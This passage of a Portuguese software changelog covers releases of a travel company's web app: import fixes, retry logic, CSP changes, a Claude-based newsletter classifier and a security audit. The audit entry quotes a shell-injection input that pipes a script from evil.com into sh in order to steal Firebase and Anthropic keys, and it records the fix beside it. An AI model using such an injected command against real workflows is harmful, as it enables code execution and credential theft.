**Validação**: `node --check` ok. E2E pendente no Chrome.

---

## [4.49.64+20260521-portal-import-cdn-fallback-notreadable-msg] — 2026-05-21

Release **PATCH** — Portal de Dicas/Importação: resiliência a
bloqueios de CDN + mensagem clara pra `NotReadableError`.

**Contexto** (Renê reporting console real do navegador):
- `Tracking Prevention blocked access to storage for
  cdn.jsdelivr.net/npm/mammoth@1.6.0/mammoth.browser.min.js`
- `[portalImport] parse error NotReadableError: The requested
  file could not be read, typically due to permission problems`

**Diagnóstico**:
1. Edge/Brave/Firefox bloqueiam scripts de jsdelivr/unpkg
   silenciosamente quando Tracking Prevention/Shields/ETP estão
   ativos. Mammoth, sendo carregado **só** de jsdelivr, falhava
   sem fallback.
2. `NotReadableError` acontece quando o File reference fica
   stale — típico de arquivos OneDrive/Drive/iCloud que não foram
   sincronizados localmente, ou quando o usuário move/renomeia o
   arquivo após selecioná-lo.

**Mudanças**:

`js/services/portalPdfParser.js`:
- **`_loadScriptFromAny(urls, globalKey)`** — helper genérico que
  tenta múltiplos CDNs em sequência, detecta sucesso pela presença
  do global (não pelo `onload`, que dispara mesmo quando o
  Tracking Prevention serve script vazio).
- **`loadPdfJs`** agora tenta: cdnjs → jsdelivr → unpkg.
- **`loadMammoth`** agora tenta: cdnjs → jsdelivr → unpkg.
- Mensagens de erro citam as proteções específicas (Prevenção de
  Rastreamento/Shields/ETP) e dão 3 soluções: adicionar exceção,
  trocar navegador, ou converter pra .xlsx.

`js/pages/portalImport.js`:
- **XLSX loader** agora tenta 3 CDNs (cdnjs, sheetjs, jsdelivr)
  com toast amigável se todos falharem.
- **Catch de erros de parse** mapeia `NotReadableError` pra
  mensagem clara: "Arquivo inacessível. Se vier de
  OneDrive/Drive/iCloud, baixe localmente antes (clique direito
  → 'Manter neste dispositivo'). Reabra esta aba se persistir."
- Toast com mensagem completa + label do arquivo com tooltip.

**Validação**: `node --check` ok nos 2 arquivos.

---

## [4.49.63+20260521-portal-import-destino-match-cadastrar-inline] — 2026-05-21

Release **PATCH** — Portal de Dicas/Importação: matching de destinos
robusto + cadastro inline.

**Contexto** (Renê): "sistema não permite importação por nao
identificar destino cadastrado (e ele esta cadastrado). precisamos
corrigir. isso é falta de leitura do modulo de destinos, certo?"

**Diagnóstico**: o fluxo já lê destinos live a cada import (sem
cache), mas comparação em `portalImport.js:340` era `===` estrita
(case-sensitive, accent-sensitive). Falhava em "Brasil" vs
"brasil", "São Paulo" vs "Sao Paulo", continente preenchido
diferente, etc. Sem botão de cadastrar quando faltava destino.

**Mudanças em `js/pages/portalImport.js`**:

1. **`_norm()`** — lowercase + NFD strip + trim + collapse whitespace.

2. **`_matchDest(allDests, dest)`** — matching em 3 camadas:
   - L1 exact: país + cidade + continente normalizados batem.
   - L2 no-continent: ignora continente (redundante na maioria).
   - L3 country-only: só país, quando planilha não tem cidade.
   - Retorna sugestão fuzzy (Levenshtein ≤ 2 no país, ou cidade
     igual com país errado) se nada bater.

3. **`showReview` async** + **`renderReviewBody()`**:
   - Faz `fetchDestinations` antes de renderizar.
   - Cada destino fica com badge ✅ **Cadastrado** (verde) /
     ⚠️ **Não cadastrado** (âmbar).
   - Não-cadastrados ganham botão **+ Cadastrar destino** inline.
   - Sugestão fuzzy aparece ("💡 Você quis dizer X?").
   - Botão "Confirmar e Importar" fica **disabled** enquanto
     houver destinos pendentes.

4. **`openInlineCadastrarModal()`** — modal pré-preenchido com
   continente/país/cidade da planilha; usa `withRetry` no
   `saveDestination`; após sucesso re-classifica tudo.

5. **`runImport(byDest, preFetchedDests)`** — usa `_matchDest`;
   refetch sempre antes de iterar (user pode ter cadastrado
   destinos entre review e import); fuzzy hint no log de cada
   skip.

**Validação**: `node --check` ok. Falta E2E manual no Chrome.

---

## [4.49.62+20260521-retry-log-polish] — 2026-05-21

Release **PATCH** — polish do log do `withRetry` descoberto durante
validação live no Chrome da v4.49.61.

**Contexto**: ao testar `withRetry` com `code: 'permission-denied'`
(non-retriable), o console exibia `[retry:label] attempt 1/3 failed:
permission-denied`. Mensagem confusa porque sugere que vai retentar
2x mais — quando na verdade o fluxo aborta imediatamente.

**Mudança em `retry.js`**:
- Non-retriable: `[retry:label] non-retriable error, aborting: <code>`.
- Esgotou tentativas: `[retry:label] attempt N/M failed (final): <code>`.
- Retentando: `[retry:label] attempt N/M failed, retrying: <code>`.

**Auditoria de call sites** (3 pontos, todos com `label`):
- `portal.js`: `portal.requesterEdit.save` ✓
- `taskModal.js`: `task.requesterEdit.ackInModal` ✓
- `tasks.js`: `task.requesterEdit.ack` ✓

**Validação rule Firestore**:
- `tasks/{taskId}` allow update: any assignee/observer/manager/creator.
- Não há restrição field-level — `requesterEditAckBy.<uid>` é
  writable por quem vê o banner. ✓

---

## [4.49.61+20260521-network-resilience-n1-banner-ack-persistent] — 2026-05-21

Release **PATCH** — resiliência de rede (camada N1) + persistência do
ack do banner de alteração de tarefa.

**Contexto** (Renê): "Internet ruim ou lenta o sistema não lida bem em
diversos módulos (banner de alerta de alteração de tarefa gerada por
meio do portal de solicitações, por exemplo, não exibe pra todos os
users). Vamos olhar para esse tema e identificar se temos de lidar de
alguma forma?" + "o banner de alteração na tarefa aparece
insistentemente... não é melhor colocar um botão de que o user está
ciente do aviso e depois ele para de ser exibido?"

**Novos serviços** (4 arquivos):
- `js/services/connection.js` — status reativo (`online` /
  `reconnecting` / `offline`), ring buffer dos últimos 20 erros
  persistido em localStorage, listeners de `online`/`offline` do
  browser, exposto em `window.__PRIMETOUR_CONNECTION__` para debug.
- `js/components/connectionIndicator.js` — chip no topo direito
  (z-index 10100), invisível quando online, animado em
  reconnecting/offline. Clique abre painel com erros recentes (admin).
- `js/services/retry.js` — `withRetry(fn, opts)` com backoff
  exponencial (800ms × 2^n + jitter), max 3 tentativas, ignora
  códigos não retriáveis (permission-denied, failed-precondition,
  invalid-argument, not-found, already-exists, unauthenticated,
  data-loss, out-of-range). Sinaliza connection em transient errors.
- `js/services/listenerError.js` — helper `listenerError(source)`
  retorna onError callback que sinaliza `markNetworkError` via lazy
  import (evita circular dep).

**Listeners agora sinalizam connection** (8 pontos):
- `tasks.js subscribeToTasks`
- `presence.js`
- `contentCalendar.js` (2 listeners)
- `csat.js` (onError adicionado onde faltava)
- `checkin.js` (3 listeners)
- `vacation.js`
- `agents.js`

**Banner persistente com ack per-user**:
- `tasks.js showRequesterEditBanners` + `taskModal.js`: skip se
  `task.requesterEditAckBy[uid] >= task.requesterEditAt`. Banner tem
  3 botões (Estou ciente / Depois / ✕), **sem auto-dismiss**.
- "OK, estou ciente" grava `requesterEditAckBy.<uid>:
  serverTimestamp()` (era destrutivo antes: `requesterEditFlag: false`
  apagava o banner pra todo mundo no momento em que um user clicasse).
- Save usa `withRetry` (3 tentativas).

**Portal save com retry**:
- `portal/portal.js` (~linha 2316): update de tarefa wrapped em
  `withRetry`. Se falhar, toast de erro + return (não fecha modal,
  user pode tentar de novo sem perder edição).

**Indicador montado no app**:
- `app.js init()`: `mountConnectionIndicator()` (try/catch).

**Validação**:
- `node --check` passou nos 14 arquivos modificados/novos.
- Simulação lógica: 5/5 casos de detecção de erro transient vs.
  permanent corretos.

---

## [4.49.47+20260520-changelog-doublecheck] — 2026-05-20

Release **PATCH** — double-check do CHANGELOG + DEV-HOURS pedido pelo Renê:
"vamos de double check no doc técnico? preciso disso 100%".

**Verificações executadas**:
1. Ordem + completude das 23 entradas novas (4.49.23 → 4.49.45): ✓ sem
   gaps, ordem decrescente correta.
2. Cross-check slugs do CHANGELOG vs git log: 14/14 batem em
   titulo+versão. Slug `20260519-...` mantido em 4.49.42-45 mesmo
   tendo sido commitados de madrugada 20/05 (convenção do repo:
   slug = dia de trabalho; `completedAt` no `dev_hours` tem
   timestamps reais).
3. Fatos técnicos: 1 discrepância corrigida em v4.49.41
   (texto dizia "330 linhas" do classify-content-ai.js; hoje são
   ~556 com os reforços de v4.49.42-43). Reescrito como "escopo
   inicial ~330 linhas; cresceu pra ~560".
4. Markdown sintaxe: 0 headers duplicados, 0 versões duplicadas, 40
   code fences bem pareadas.
5. Cross-check Firestore vs CHANGELOG: 23 releases approved no
   `dev_hours`, todas listadas no CHANGELOG. Sem ghosts, sem missing.
6. DEV-HOURS.md totais batem com Firestore: 197 entries / 788h 11min
   / R$ 118.227,00 / subtotais 13,09h + 22,53h = 35,62h ✓.

---

## [4.49.46+20260520-changelog-devhours-sprint-completo] — 2026-05-20

Release **PATCH** — backfill do doc técnico + `dev_hours` cobrindo
o sprint completo de 19-20/05/2026. Resposta ao Renê: "atualize o
doc tecnico e o horas dev → eu nao rodo nada manualmente. quem faz
as coisas é vc. quero pronto".

**Entregue**:
- `CHANGELOG.md` ganha 23 entradas (4.49.23 → 4.49.45)
- `functions/add-dev-hours-4.49.23-31.cjs` (criado + executado): 9
  releases (manhã/tarde) · 13,09h · R$ 1.963,50
- `functions/add-dev-hours-4.49.32-45.cjs` (criado + executado): 14
  releases (noite/madrugada) · 22,53h · R$ 3.379,50
- `docs/DEV-HOURS.md` header atualizado: novo total 788h 11min /
  R$ 118.227,00 / 180 releases + 17 phases / 7h 22min/dia

**Recalibragem** em v4.49.41 e v4.49.42: de `mega` pra `large` (mega
daria 36h e 28.8h numa única release — irrealista mesmo pra sprint
denso). Large com integration+investigation = 4,5h / 3,6h
respectivamente, coerente com bugs complexos do mesmo dia (ex:
metaLinks 4.49.21 = 6h base).

---

## [4.49.45+20260519-regression-defensiveness] — 2026-05-19

Release **PATCH** — regression review após o sprint do shadow mode +
security audit. Resposta ao Renê: "vc testou se tudo isso nao prejudicou
alguma funcionalidade do sistema? da ultima vez travou o login..."

**Verificações executadas** (8 chapters):
1. `node --check` em 5 módulos críticos: OK
2. Imports de `nlPerformance.js` resolvidos (6/6 found)
3. `store.isMaster()` (line 244) e `store.can()` (line 146) confirmados
4. `firestore.rules`: braces balanceadas (226=226), 106 match blocks,
   `users`/`roles` intactos, 3 collections novas presentes
5. CSP diff: SÓ adicionou hosts SFMC BU CDN, nada removido
6. `seedDefaultAgents`: try/catch por seed isola falhas
7. `MODULE_REGISTRY` tem fallback `|| a.module` no aiHub:180
8. Test harness: 61/61 passou após refactor de segurança

**1 risco real encontrado + blindado**: `renderShadowModeBlock` era
chamado dentro de template literal sem try/catch local. Se exception
interna fosse lançada (ex: regra Firestore não deployada), o
`root.innerHTML` inteiro falharia → aba "Conteúdo & Temas" mostraria
nada. Fix em 2 camadas: IIFE try/catch no template wrap +
`.catch()` em `wireShadowModeDrill()` async.

**Login verificado intacto** — js/auth/auth.js: 0 mudanças hoje.
firestore.rules `/users/` e `/roles/`: 0 mudanças.

---

## [4.49.44+20260519-security-audit-fixes] — 2026-05-19

Release **PATCH** — auditoria de segurança bank-grade do sprint.
Resposta ao Renê: "acho prudente fazer uma auditoria em segurança pra
cobrir possiveis, com nivel de exigencia de um banco".

Findings: **2 CRITICAL + 2 HIGH + 3 MEDIUM** (operacionais).

🔴 **CRITICAL #1 — Firestore rules ausentes** pra
`nl_ai_classifier_runs / promotions / rollbacks`. Default-deny travaria
sparkline. Fix: regras append-only via Admin SDK.

🔴 **CRITICAL #6 — Shell injection em 3 workflows** via inputs
`limit`/`since`/`confirmar` interpolados em bash. Vetor:
`since=$(curl evil.com/payload.sh | sh)` → exfiltração de
`FIREBASE_PRIVATE_KEY` e `ANTHROPIC_API_KEY`. Fix em 4 camadas: inputs
via env vars, `set -euo pipefail`, allowlist regex, bash arrays.

🟠 **HIGH #2 — Decision buttons sem gate de permissão**. Fix:
`canVoteOnDecisions` gate na UI + defesa em profundidade no handler.

🟠 **HIGH #5 — Workflows sem `permissions:` explícito**. Fix:
`permissions: contents: read` (least-privilege).

🟡 **MEDIUM abertos** (documentados em `SECURITY-AUDIT-2026-05-19.md`):
PII em htmlText (→ DPA Anthropic), prompt injection insider, pinning
de actions `@v4` (sprint de governança separada).

---

## [4.49.43+20260519-nl-classifier-test-harness] — 2026-05-19

Release **PATCH** — test harness pra `classify-content-ai.js`. Resposta
ao Renê: "testou a operacao dele (sem ativar a API, apenas verificando
se ele trabalha, de fato)?" — não tinha testado além de `node --check`.

**Refatoração**: gate `IS_CLI` separa execução CLI de require pra
testes. Exporta helpers puros (`parseClaudeJson`, `validateOutput`,
`buildPayload`, `shouldClassify`, `agentVersion`, `estimateRunCostUsd`).

**Test harness `classify-content-ai.test.js`** (61 testes em 8 áreas):
parseClaudeJson (6), validateOutput (8), buildPayload (7), shouldClassify
(5), agentVersion (5), estimateRunCostUsd (5), fluxo integrado
parse+validate (4), E2E simulado (4).

**Workflow CI** ganha step "Run smoke tests" ANTES da chamada Claude
(falha rápido sem queimar tokens). Edge cases manuais validados: aspas
curvas, emoji, resposta multi-linha com preface.

Custo simulado por chamada: $0.0004 (cache hit 94%).

---

## [4.49.42+20260519-nl-classifier-pipeline-100pct] — 2026-05-19

Release **MINOR** — pipeline 100% operacional do classificador IA.
Resposta ao Renê: "faça o que tem de fazer pra ele funcionar 100%...
quero o caminho que funciona 100%, com tudo que temos direito."

**Reforços em `classify-content-ai.js`**: cost cap diário (lê
`nl_ai_classifier_runs`, exit 2 se estourado), audit per-doc em
`ai_usage_logs` (formato compatível com Cloud Function), exit codes
semânticos (0=OK, 1=erro fatal, 2=budget estourado, 3=erro >20%).

**NOVO — `promote-ai-to-prod.js` + workflow**: cutover idempotente com
backup automático em `commercialPrev`. Filtro de confiança configurável.
Workflow manual com confirmação literal "PROMOVER".

**NOVO — `rollback-ai-classification.js` + workflow**: reverte cutover,
defesa `missingBackup`, filtro `--since=<ISO>`. Workflow manual com
confirmação "REVERTER".

**Dashboard NL → Conteúdo & Temas → bloco shadow mode** ganha:
sparkline da evolução temporal (3 linhas vs meta 90%), painel admin
(3 botões pros workflows com semáforo), botões de decisão por
divergência ("IA certa" / "regex certo" → grava em
`extracted.humanDecisionCommercial/Tourism`).

Concurrency lock em `classify-content-ai.yml`.

---

## [4.49.41+20260519-classificador-newsletters-shadow-mode] — 2026-05-19

Release **MINOR** — shadow mode do agente Classificador NL. Pipeline:
shadow → revisão humana → cutover → rollback. Resposta ao Renê: "quero
o caminho da excelencia".

**Princípio arquitetural**: cada agente vive no seu módulo (não há
agentScheduler genérico). IA Hub = registry + governança; orquestração
nativa do módulo.

**`scripts/classify-content-ai.js`** (escopo inicial ~330 linhas;
cresceu pra ~560 com cost cap + audit + exports nas releases
seguintes): lê agente `nl-content-classifier` do Firestore (single
source of truth — editar
prompt no IA Hub propaga sem deploy), kill switch soft
(`agent.active === false` → exit 0), idempotência por hash
`model+systemPrompt`, chama Anthropic com `cache_control` (cache hit
~10% do input), grava em campos paralelos `extracted.ai*` (NÃO toca
em produção), concorrência 3 + backoff 429/5xx, resumo em
`nl_ai_classifier_runs`.

**Workflow `classify-content-ai.yml`**: cron `45 6 * * *` (15min depois
do `classify-content.js` regex) + manual com dry/force/limit/verbose.

**Dashboard shadow mode block**: empty state com checklist, KPIs com
semáforo (≥90% verde), distribuição de confiança, tabelas top 10
de divergências por eixo.

**Doc**: `scripts/SHADOW-MODE-NL-CLASSIFIER.md` com arquitetura, setup,
custo estimado, troubleshooting.

---

## [4.49.40+20260519-classificador-newsletters-claude-haiku] — 2026-05-19

Release **PATCH** — seed do Classificador NL muda de Gemini para
Anthropic Claude Haiku 4.5. Resposta ao Renê: "nao vou usar gemini.
vou usar api claude".

Provider/model atualizados. Code-path validado: `runAgent` pula
validação de key local quando provider==='anthropic' → `callLLMSecure`
→ Cloud Function `callLLM` → Secret Manager → `api.anthropic.com`.
Prompt caching automático ≥1024 chars (nosso prompt tem ~7k → cache
hit cobra ~10% do input).

---

## [4.49.39+20260519-agente-classificador-newsletters-seed] — 2026-05-19

Release **PATCH** — agente-seed `nl-content-classifier` no IA Hub
(DESATIVADO). Resposta ao Renê: "precisamos deixar ele pronto no IA
Hub, mas sem ativá-lo ainda. faça algo criterioso, com o mesmo padrão
que vc utilizou para fazer as categorizações".

Novo seed em `SYSTEM_SEED_AGENTS` espelha 1:1 as regras de
`scripts/classify-content.js`: prioridade `sazonal > promocao > parceiro
> inspiracional` (Comercial) e `evento > aereo > roteiro > servico >
hotelaria > cruzeiro > produto > outros > destino` (Turismo), trigger
rule 1-match-subject OU 2+-match-htmlText, CSAT bypass, regra especial
de BU (BTG/Centurion não vira "parceiro" só pela BU), 7 anti-padrões
explícitos, 2 few-shot examples.

Defaults conservadores: `temperature 0.1`, `maxTokens 512`, `rateLimit
30/min`, `maxCostPerDayUsd 2`, `visibility admin`. Todos os 4 triggers
desabilitados.

Side fix: `'nl'` em `MODULE_REGISTRY` pro label "Newsletters" no card.

---

## [4.49.38+20260519-pdf-conteudo-rewrite] — 2026-05-19

Release **PATCH** — rewrite do PDF de Newsletter → Conteúdo & Temas
seguindo padrão visual do dashboard de Produtividade. Resposta ao Renê:
"a exportacao para pdf ainda carece de melhorias. faltam graficos,
padronizacao, retirada de caracteres especiais...".

**Antes**: `jsPDF` cru sem `pdfKit`, títulos com emojis (💼 ✈️ 🌍 —
viram caixinhas no Helvetica/WinAnsi), sem capa/footer/gráficos, 7
tabelas empilhadas em retrato.

**Agora** (landscape, espelha Produtividade): capa branded, KPI strip
de 6 blocos com semáforo, **8 gráficos de barras horizontais nativas**
em grade 2×4 (Comercial × Turismo / Países × Cidades / Hotéis × Marcas
/ Cruzeiros × Temas), tabela final com pintura semafórica, footer
paginado, sanitização total (`txt()` + `stripEmoji()`), `withExportGuard`.

---

## [4.49.37+20260519-csp-libera-todas-bus-sfmc] — 2026-05-19

Release **PATCH** — CSP `img-src` libera as 5 CDNs SFMC BU completas.
Resposta ao Renê: "U0225, U0224, P0224, P0220, U0223, P0222... está
percebendo o padrão?"

**Diagnóstico real**: Firestore tinha `imageUrls=5` em todos os 6 docs
reportados. Falha era CSP — só liberava `image.viagens.newsletterprime.com.br`.
Faltavam 4 CDNs: `partnersbtgpactual.com.br`, `ultrabtgpactual.tur.br`,
`mktpts.tur.br`, `centurion.mktpts.tur.br`.

Padrão de erro registrado: "funcionou pra mim => liberei só o que
testei". **Validação live**: modal U0225 com 5/5 imagens carregadas.

---

## [4.49.36+20260519-fix-merge-waves-imageurls] — 2026-05-19

Release **PATCH** — fix do merge de waves: `imageUrls` passa a vir de
QUALQUER wave do grupo, não só do `base` alfabeticamente. Resposta ao
Renê: "tem a ver com o disparo ter feito em ondas e vc condensar em
um resultado só?" (acertou em cheio).

**Diagnóstico**: `dedupContentByCampaign` + `mergeWaves` em
`nlPerformance.js` consolidavam waves (P0209_1/_2/_3 = 1 campanha)
pegando o `base` alfabético. Se P0209_1 não tinha `imageUrls` e P0209_2
tinha 5, o merge cuspia o doc do _1 → modal sem imagens.

Fix: `const waveWithImgs = group.find(d => Array.isArray(d.imageUrls)
&& d.imageUrls.length > 0); const mergedImageUrls = waveWithImgs?.imageUrls
|| base.imageUrls || [];`

---

## [4.49.35+20260519-desacopla-ia-mc-sync] — 2026-05-19

Release **MAJOR** (arquitetural) — desacopla IA do workflow de sync.
Resposta ao Renê: "o que tem a ver IA com o sync?"

`mc-sync.js` chamava `extractEntitiesViaAgent` em loop → quota Gemini
estourava no meio da sync → retry loop infinito → timeout 15min do
workflow → sync parou em 06/05 (gap 07/05 → 19/05).

**Fix arquitetural**: cada workflow com 1 responsabilidade.
- `mc-sync.js`: SÓ sincroniza performance + extrai imagens (zero IA)
- `enrich-content.js`: enriquecimento determinístico (dicionário curado)
- `classify-content.js`: classificação dupla por regex
- `extractEntitiesViaAgent`: wrapped em `if (false && ...)` dead-code

Cada feature ganha seu próprio workflow + cron. Falhas isoladas.

---

## [4.49.34+20260519-circuit-breaker-gemini] — 2026-05-19

Release **PATCH** — circuit breaker contra quota Gemini estourada no
mc-sync (mitigação imediata enquanto v4.49.35 desacoplava por completo).

Após N falhas consecutivas de quota, desativa chamadas IA até o final
da run e termina com warning em vez de timeout.

---

## [4.49.33+20260519-nl-ui-no-art-honest-contexto] — 2026-05-19

Release **PATCH** — UI honesta para docs sem `imageUrls` no modal
"Ver arte". Em vez de "imagem indisponível" genérico, mostra contexto
por `noArtReason`: csat (📋 pesquisa), warmup (🔥 warm-up), test
(🧪 teste interno), pending (⚠ asset deletado/sem html).

---

## [4.49.32+20260519-categorize-no-art-100pct] — 2026-05-19

Release **MINOR** — 3 itens completados: (1) bloco "Tipo de newsletter
(legado)" REMOVIDO do dashboard (redundante após v4.49.27), exports
XLS/PPT também limpos. (2) Tooltips ilegíveis viraram modal estruturado
(`INFO_MODAL_DEFINITIONS` com categorias/prioridade/exemplos).
(3) `scripts/categorize-no-art.js` categoriza os 64 docs sem
`imageUrls` (55 marcados csat/warmup/test, 9 pending por asset deletado).

Resposta ao Renê: "trabalho com excelencia... 100% das imagens das
news, e nao 90%".

---

## [4.49.31+20260519-csp-img-src-sfmc] — 2026-05-19

Release **PATCH** — bugfix do v4.49.30: backfill funcionou (692 docs com
imageUrls) mas modal "Ver arte" mostrava "imagem indisponível" pra tudo.

**Causa:** Content-Security-Policy `img-src` não tinha os domínios SFMC.
Hosts encontrados via debug ao vivo:
- `image.viagens.newsletterprime.com.br` — CDN próprio do PRIMETOUR
- `ftpprime.blob.core.windows.net` — Azure Storage com hero images
- `image.exct.net`, `image.s10.exacttarget.com` — CDN SFMC genérico

Todos adicionados ao `img-src`. **Validado live**: 5/5 imagens renderizam
em naturalWidth=800px. Zero risco XSS — `<img>` com src externo não
executa JS.

---

## [4.49.30+20260519-backfill-image-urls-legado] — 2026-05-19

Release **MINOR** — Backfill do legado de imageUrls (resposta ao user:
"não conseguimos pegar o legado de imagens pq?" — corte de caminho meu
em v4.49.29).

### Script + workflow

- `scripts/backfill-image-urls.js`: refetch HTML do SFMC por assetName,
  extrai top 5 imagens via mesmo `extractContentImages()` do mc-sync.js,
  popula `doc.imageUrls`. Idempotente, suporta `--dry`, `--bu`, `--limit`.
- `.github/workflows/backfill-image-urls.yml`: workflow_dispatch manual
  reusando secrets MC_* + FIREBASE_* do cron de sync.

### Bugs encontrados durante deploy

1. **MIDs errados** (chutei sem checar mc-sync): 401 SFMC token. Fixei
   com os MIDs reais (546014130 primetour, 546015816 btg-partners, etc).
2. **Query body com `fields` specifier**: 400 "views.html.content is not
   a valid field argument". Removido, agora retorna doc completo.

### Resultado

| BU | Docs com imageUrls (antes → depois) |
|---|---|
| btg-ultrablue | 0/240 → **231/240 (96%)** |
| primetour     | 0/209 → **192/209 (92%)** |
| pts           | 0/82  → **80/82 (98%)** |
| btg-partners  | 0/152 → **130/152 (86%)** |
| centurion     | 0/73  → **59/73 (81%)** |
| **TOTAL** | 0/756 → **692/756 (92%)** · **1.181 URLs adicionadas** |

Em ~30 segundos · 265 assets únicos consultados · 17 assets não
encontrados no SFMC (provavelmente deletados desde o sync original).

---

## [4.49.29+20260519-nl-ver-arte-modal] — 2026-05-19

Release **MINOR** — User: "gostaria de clicar na newsletter na aba
Performance ver a arte. Teríamos que hospedar a arte de qualquer forma
pra IA ler e interpretar, né?". Implementado.

### Captura de URLs no mc-sync

`scripts/mc-sync.js`: a função `extractContentImages()` já existia (filtra
trackers, ordena por score visual) mas as URLs eram **descartadas após
Vision API consumir**. Agora persistimos: `enrich.imageUrls` (top 5) vai
direto pro doc `mc_performance.imageUrls`. Mesma extração — uma única
fonte de verdade entre IA e UI.

Salva tanto em **cache hit** (passou pelo Vision antes) quanto em **fresh
fetch** (asset novo).

### UI: click no nome do email → modal "🖼 Ver arte"

Coluna "Nome" na tabela Disparos vira clicável (`a.nl-art-link`). Ícone
de hint: 🖼 quando há arte salva, 🔍 quando não há ainda (legado pré-v4.49.29).

Modal mostra:
- Subject + data + BU + total enviados + open rate
- Grid responsive (`auto-fit minmax(260px,1fr)`) das imagens
- Imagens em `aspect-ratio:16/10`, `object-fit:contain` (preserva proporção)
- Click numa imagem → abre em tamanho real (`target=_blank rel=noopener`)
- Lazy-loading + fallback "imagem indisponível" se CDN responder 4xx

Empty state honesto pra docs antigos: explica que apareceria quando o
asset for re-sincronizado.

### Hospedagem: SFMC CDN por enquanto

URLs servidas pelo CDN do SFMC (mesmas URLs que os destinatários veem
no email). Públicas, estáveis enquanto o asset existir. Hospedagem em
Firebase Storage (cópia nossa, controle de versão, defesa contra delete
no SFMC) é evolução natural mas não bloqueia o uso atual.

### IA + UI compartilham a fonte

Antes: Vision API baixava as imagens, analisava, descartava URLs.
Agora: URLs são salvas, Vision consome do mesmo array, UI exibe igual.
**Single source of truth** entre IA e UI da arte.

---

## [4.49.28+20260519-nl-content-exports-xls-pdf-ppt] — 2026-05-19

Release **MINOR** — Exports da aba "Conteúdo & Temas" (ponto 5 do roadmap).
Substitui o alert "será entregue na 4.7.0 · Fase 3" por exports reais nos
**3 formatos**: Excel, PDF e PowerPoint, todos honrando os filtros aplicados.

### Princípio: filtros respeitados

Single source of truth: `_contentExportSnapshot()` → roda
`applyAllContentFilters` na cache atual e devolve `{docs, enriched,
agg, filters}`. Tudo que o user vê no dashboard é o que sai no export.

Filtros honrados:
- BU
- Período (`180d` default)
- País, Cidade, Tema, Tipo (legado)
- **Comercial** e **Turismo** (eixos v4.49.27)
- Busca livre

Cabeçalho de cada export mostra o resumo dos filtros (ex: "BU: centurion ·
Período: últimos 90d · Comercial: sazonal") pra contexto.

### Excel (`.xlsx`) — 10 sheets

- **Resumo**: filtros, contagens KPI, open rate médio
- **Comercial / Turismo**: distribuição nos eixos novos
- **Países / Cidades / Hotéis / Cruzeiros / Temas / Marcas**: cada um
  com colunas Disparos · Enviados · Abertura · Cliques · Opt-out
- **Tipo Legado**: classificação antiga (preservada)
- **Disparos**: uma linha por campanha (subject, BU, data, métricas,
  comercial, turismo, países, cidades, hotéis, marcas)

### PDF (`.pdf`) — A4 portrait

- Capa com título + filtros + KPIs em linha
- 7 tabelas (top 30 cada): Comercial, Turismo, Países, Cidades, Hotéis,
  Cruzeiros, Temas — todas com Disparos/Enviados/Abertura/Cliques/Opt-out
- Quebra de página automática quando passa de 260mm

### PowerPoint (`.pptx`) — layout wide

- **Slide capa** com filtros + KPIs (BU/período/total/open rate)
- 8 slides de tabela (top 15 cada): Comercial, Turismo, Países, Cidades,
  Hotéis, Cruzeiros, Temas, Tipo Legado
- Header dourado, células com cor PRIMETOUR navy, fonte Poppins
- Pronto pra apresentação executiva

### Buttons no header

`⬇ Excel · ⬇ PDF · ⬇ PPT` substituem o botão antigo "⬇ PDF" (que só
mostrava alert). Mesmo cluster do "↻ Atualizar".

---

## [4.49.27+20260519-nl-eixos-duplos-comercial-turismo] — 2026-05-19

Release **MINOR** — Eixos duplos de classificação no Newsletter
"Conteúdo & Temas" (spec do user, ponto 1 do roadmap).

### Eixo COMERCIAL (`extracted.commercial`)

Tema macro da comunicação:

| Valor | Detecção | Triggers principais |
|---|---|---|
| `promocao` | %OFF, desconto, "noite FREE", cashback, crédito US$ | Oferta/condição comercial |
| `sazonal` | Estação, feriado, data comemorativa, mês+ano | Período específico |
| `parceiro` | Cartão Partners, Centurion Card, Latam Pass, Bocelli | Empresa parceira em destaque |
| `inspiracional` | (default) | Editorial sem valor/sazonalidade/parceiro |

**Prioridade** (spec do user): `sazonal > promocao > parceiro > inspiracional`

### Eixo TURISMO (`extracted.tourism`)

Tipo de conteúdo turístico:

| Valor | Detecção | Exemplos |
|---|---|---|
| `evento` | Show, GP, Wimbledon, Bocelli, Camarote | Comunicações sobre eventos |
| `aereo` | Voo, passagem, classe executiva, milhas | Comunicações aéreas |
| `roteiro` | "X noites", day-by-day, pacote, multi-destino | Pacote fechado |
| `servico` | Transfer, concierge, Lifestyle Manager, alfaiate | Serviço de concierge |
| `hotelaria` | Hospedagem, hotel, resort, villa, suíte | Bloco/destaque de hotel |
| `cruzeiro` | Yacht, navio, Silversea, Aqua Mekong | Cruzeiros/yachts |
| `produto` | Flores, presente, revista | Produto físico |
| `destino` | (fallback se tem cidade/país) | Editorial sobre destino |
| `outros` | Trens (Orient Express, Belmond), CSAT | Casos especiais |

**Prioridade** (spec do user): `evento > aereo > roteiro > servico > hotelaria > cruzeiro > produto > destino > outros`

### Distribuição real (756 docs classificados)

**Comercial:**
- 64% inspiracional · 16% sazonal · 12% parceiro · 8% promoção

**Turismo:**
- 29% outros (CSAT + trens raros) · 25% hotelaria · 17-18% destino ·
  14% serviço · 6% cruzeiro · 3% aéreo · 3% evento · 2% roteiro

### Pipeline

1. `functions/classify-mc-claude.cjs` — classifier determinístico (regex
   sobre subject+name+htmlText com anti-boilerplate). Marca
   `extracted.classifiedBy='claude-classify-v4.49.27'`.
2. `aggregateContent()` em `nlPerformance.js` ganhou maps `commercial`
   e `tourism` agregando count + sent + open + click + opt-out.
3. Dashboard "Conteúdo & Temas" ganhou 2 blocos novos no topo:
   `💼 Classificação Comercial` e `✈️ Classificação Turismo`.
4. Drill-down clicável → modal com lista de disparos (mesma UX dos
   outros blocos da aba).
5. Filtros novos `_contentFiltersState.commercial` e `.tourism`
   aplicados em `applyAllContentFilters`.

### Pendências

- UI dos filtros (dropdowns) será adicionada na próxima release —
  estado já está pronto, falta o `<select>` no DOM.
- Modal de edição manual (extracted editor) ainda não tem campos pros
  eixos duplos — backfill futuro.

---

## [4.49.26+20260519-nl-enrich-htmltext-bodied] — 2026-05-19

Release **PATCH** — User: "ler o html é fundamental. subject entrega muito
pouco". Aceito. Estendido o backfill pra processar `htmlText` (texto
extraído do body, ~6-8 KB por doc) além de subject + name.

### Anti-boilerplate (lições do DRY-RUN)

Lendo o body apareceram 2 armadilhas:

1. **Header reusado entre emails**: BTG Partners reaproveitava o título
   "Cartão Partners BTG — Hospedagens na Tailândia" como header de
   emails sobre outros temas (São Paulo, Suíça). Resultado: Tailândia
   adicionada em 50 docs falsamente no primeiro DRY-RUN.
